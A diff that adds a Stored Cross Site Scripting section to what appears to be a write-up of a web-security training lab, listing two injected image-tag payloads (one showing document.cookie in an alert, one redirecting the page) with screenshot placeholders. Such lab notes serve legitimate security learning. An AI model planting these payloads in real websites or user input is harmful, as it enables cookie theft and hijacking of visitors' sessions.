@@ -280,6 +280,26 @@ output
 
 ### Stored Cross Site Scripting (XSS)
 
+input
+
+```bash
+<img src=x onerror=alert(document.cookie) />
+```
+
+![alt text](images/photo_21.png)
+
+output
+
+![alt text](images/photo_22.png)
+
+input
+
+```bash
+<img src=x onerror='window.location.href="http://www.w3schools.com";'/>
+```
+
+![alt text](images/photo_23.png)
+
 ### Content Security Policy (CSP) Bypass
 
 ### JavaScript Attacks
